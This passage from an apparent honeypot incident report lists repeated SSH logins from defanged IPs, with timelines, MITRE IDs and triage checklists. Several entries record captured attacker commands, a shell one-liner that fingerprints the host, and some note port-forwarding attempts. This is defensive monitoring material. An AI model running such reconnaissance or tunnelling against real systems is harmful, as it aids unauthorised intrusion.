| `2026-07-24 05:16:19` | `cowrie.client.version` |
| `2026-07-24 05:16:19` | `cowrie.client.kex` |
| `2026-07-24 05:16:20` | `cowrie.login.success` |
| `2026-07-24 05:16:20` | `cowrie.session.params` |
| `2026-07-24 05:16:20` | `cowrie.command.input` |
| `2026-07-24 05:16:21` | `cowrie.log.closed` |
| `2026-07-24 05:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9436902186a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:18 |
| **Last Seen** | 2026-07-24 05:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:18:08` | `cowrie.session.connect` |
| `2026-07-24 05:18:08` | `cowrie.client.version` |
| `2026-07-24 05:18:08` | `cowrie.client.kex` |
| `2026-07-24 05:18:11` | `cowrie.login.success` |
| `2026-07-24 05:18:12` | `cowrie.session.params` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:12` | `cowrie.command.success` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:12` | `cowrie.command.input` |
| `2026-07-24 05:18:13` | `cowrie.log.closed` |
| `2026-07-24 05:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f5dbf00b7a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:18 |
| **Last Seen** | 2026-07-24 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:18:09` | `cowrie.session.connect` |
| `2026-07-24 05:18:09` | `cowrie.client.version` |
| `2026-07-24 05:18:09` | `cowrie.client.kex` |
| `2026-07-24 05:18:10` | `cowrie.login.success` |
| `2026-07-24 05:18:11` | `cowrie.session.params` |
| `2026-07-24 05:18:11` | `cowrie.command.input` |
| `2026-07-24 05:18:11` | `cowrie.log.closed` |
| `2026-07-24 05:18:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b10d59d2912f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:19 |
| **Last Seen** | 2026-07-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:19:55` | `cowrie.session.connect` |
| `2026-07-24 05:19:55` | `cowrie.client.version` |
| `2026-07-24 05:19:55` | `cowrie.client.kex` |
| `2026-07-24 05:19:55` | `cowrie.login.success` |
| `2026-07-24 05:19:56` | `cowrie.session.params` |
| `2026-07-24 05:19:56` | `cowrie.command.input` |
| `2026-07-24 05:19:56` | `cowrie.log.closed` |
| `2026-07-24 05:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c2076eff567

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:20 |
| **Last Seen** | 2026-07-24 05:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:20:38` | `cowrie.session.connect` |
| `2026-07-24 05:20:39` | `cowrie.client.version` |
| `2026-07-24 05:20:39` | `cowrie.client.kex` |
| `2026-07-24 05:20:41` | `cowrie.login.success` |
| `2026-07-24 05:20:43` | `cowrie.session.params` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.command.success` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.command.input` |
| `2026-07-24 05:20:43` | `cowrie.log.closed` |
| `2026-07-24 05:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d561cac99732

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-07-24 05:21 |
| **Last Seen** | 2026-07-24 05:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:21:21` | `cowrie.session.connect` |
| `2026-07-24 05:21:21` | `cowrie.client.version` |
| `2026-07-24 05:21:21` | `cowrie.client.kex` |
| `2026-07-24 05:21:23` | `cowrie.login.success` |
| `2026-07-24 05:21:24` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aee8a6c89cb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:21 |
| **Last Seen** | 2026-07-24 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:21:36` | `cowrie.session.connect` |
| `2026-07-24 05:21:36` | `cowrie.client.version` |
| `2026-07-24 05:21:36` | `cowrie.client.kex` |
| `2026-07-24 05:21:37` | `cowrie.login.success` |
| `2026-07-24 05:21:37` | `cowrie.session.params` |
| `2026-07-24 05:21:37` | `cowrie.command.input` |
| `2026-07-24 05:21:37` | `cowrie.log.closed` |
| `2026-07-24 05:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-843dc9a3ebf7

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-07-24 05:21 |
| **Last Seen** | 2026-07-24 05:22 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:21:51` | `cowrie.session.connect` |
| `2026-07-24 05:21:54` | `cowrie.client.version` |
| `2026-07-24 05:21:54` | `cowrie.client.kex` |
| `2026-07-24 05:22:04` | `cowrie.login.success` |
| `2026-07-24 05:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567d8bbf5643

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-07-24 05:22 |
| **Last Seen** | 2026-07-24 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:22:09` | `cowrie.session.connect` |
| `2026-07-24 05:22:09` | `cowrie.client.version` |
| `2026-07-24 05:22:09` | `cowrie.client.kex` |
| `2026-07-24 05:22:10` | `cowrie.login.success` |
| `2026-07-24 05:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67f0d657eef8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:23 |
| **Last Seen** | 2026-07-24 05:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:23:01` | `cowrie.session.connect` |
| `2026-07-24 05:23:01` | `cowrie.client.version` |
| `2026-07-24 05:23:01` | `cowrie.client.kex` |
| `2026-07-24 05:23:04` | `cowrie.login.success` |
| `2026-07-24 05:23:05` | `cowrie.session.params` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:05` | `cowrie.command.success` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:05` | `cowrie.command.input` |
| `2026-07-24 05:23:06` | `cowrie.log.closed` |
| `2026-07-24 05:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e36bb42c146a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:23 |
| **Last Seen** | 2026-07-24 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:23:19` | `cowrie.session.connect` |
| `2026-07-24 05:23:19` | `cowrie.client.version` |
| `2026-07-24 05:23:19` | `cowrie.client.kex` |
| `2026-07-24 05:23:19` | `cowrie.login.success` |
| `2026-07-24 05:23:20` | `cowrie.session.params` |
| `2026-07-24 05:23:20` | `cowrie.command.input` |
| `2026-07-24 05:23:20` | `cowrie.log.closed` |
| `2026-07-24 05:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c2379b51a7

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-07-24 05:24 |
| **Last Seen** | 2026-07-24 05:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:24:17` | `cowrie.session.connect` |
| `2026-07-24 05:24:18` | `cowrie.client.version` |
| `2026-07-24 05:24:18` | `cowrie.client.kex` |
| `2026-07-24 05:24:21` | `cowrie.login.success` |
| `2026-07-24 05:24:23` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f2945dfb77

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]109` |
| **First Seen** | 2026-07-24 05:24 |
| **Last Seen** | 2026-07-24 05:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:24:35` | `cowrie.session.connect` |
| `2026-07-24 05:24:36` | `cowrie.client.version` |
| `2026-07-24 05:24:36` | `cowrie.client.kex` |
| `2026-07-24 05:24:38` | `cowrie.login.success` |
| `2026-07-24 05:24:38` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]109` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf0ad44dd8b2

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-07-24 05:24 |
| **Last Seen** | 2026-07-24 05:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:24:43` | `cowrie.session.connect` |
| `2026-07-24 05:24:44` | `cowrie.client.version` |
| `2026-07-24 05:24:44` | `cowrie.client.kex` |
| `2026-07-24 05:24:48` | `cowrie.login.success` |
| `2026-07-24 05:24:49` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:24:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9669d27d5bb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:25 |
| **Last Seen** | 2026-07-24 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:25:05` | `cowrie.session.connect` |
| `2026-07-24 05:25:05` | `cowrie.client.version` |
| `2026-07-24 05:25:05` | `cowrie.client.kex` |
| `2026-07-24 05:25:05` | `cowrie.login.success` |
| `2026-07-24 05:25:06` | `cowrie.session.params` |
| `2026-07-24 05:25:06` | `cowrie.command.input` |
| `2026-07-24 05:25:06` | `cowrie.log.closed` |
| `2026-07-24 05:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b326ba54f9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:25 |
| **Last Seen** | 2026-07-24 05:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:25:09` | `cowrie.session.connect` |
| `2026-07-24 05:25:09` | `cowrie.client.version` |
| `2026-07-24 05:25:09` | `cowrie.client.kex` |
| `2026-07-24 05:25:12` | `cowrie.login.success` |
| `2026-07-24 05:25:14` | `cowrie.session.params` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.command.success` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.command.input` |
| `2026-07-24 05:25:14` | `cowrie.log.closed` |
| `2026-07-24 05:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-943c6b87ebdc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:26 |
| **Last Seen** | 2026-07-24 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:26:49` | `cowrie.session.connect` |
| `2026-07-24 05:26:49` | `cowrie.client.version` |
| `2026-07-24 05:26:49` | `cowrie.client.kex` |
| `2026-07-24 05:26:49` | `cowrie.login.success` |
| `2026-07-24 05:26:50` | `cowrie.session.params` |
| `2026-07-24 05:26:50` | `cowrie.command.input` |
| `2026-07-24 05:26:50` | `cowrie.log.closed` |
| `2026-07-24 05:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ce6c58e25c9

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-24 05:27 |
| **Last Seen** | 2026-07-24 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:27:08` | `cowrie.session.connect` |
| `2026-07-24 05:27:08` | `cowrie.client.version` |
| `2026-07-24 05:27:08` | `cowrie.client.kex` |
| `2026-07-24 05:27:09` | `cowrie.login.success` |
| `2026-07-24 05:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-062a12e1c21f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-24 05:27 |
| **Last Seen** | 2026-07-24 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:27:08` | `cowrie.session.connect` |
| `2026-07-24 05:27:08` | `cowrie.client.version` |
| `2026-07-24 05:27:08` | `cowrie.client.kex` |
| `2026-07-24 05:27:09` | `cowrie.login.success` |
| `2026-07-24 05:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32143cf4af4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:27 |
| **Last Seen** | 2026-07-24 05:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:27:25` | `cowrie.session.connect` |
| `2026-07-24 05:27:26` | `cowrie.client.version` |
| `2026-07-24 05:27:26` | `cowrie.client.kex` |
| `2026-07-24 05:27:30` | `cowrie.login.success` |
| `2026-07-24 05:27:32` | `cowrie.session.params` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:32` | `cowrie.command.success` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:32` | `cowrie.command.input` |
| `2026-07-24 05:27:34` | `cowrie.log.closed` |
| `2026-07-24 05:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35fd18b4c1b3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:28 |
| **Last Seen** | 2026-07-24 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:28:33` | `cowrie.session.connect` |
| `2026-07-24 05:28:33` | `cowrie.client.version` |
| `2026-07-24 05:28:33` | `cowrie.client.kex` |
| `2026-07-24 05:28:34` | `cowrie.login.success` |
| `2026-07-24 05:28:34` | `cowrie.session.params` |
| `2026-07-24 05:28:34` | `cowrie.command.input` |
| `2026-07-24 05:28:34` | `cowrie.log.closed` |
| `2026-07-24 05:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e88127da0dbb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:29 |
| **Last Seen** | 2026-07-24 05:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
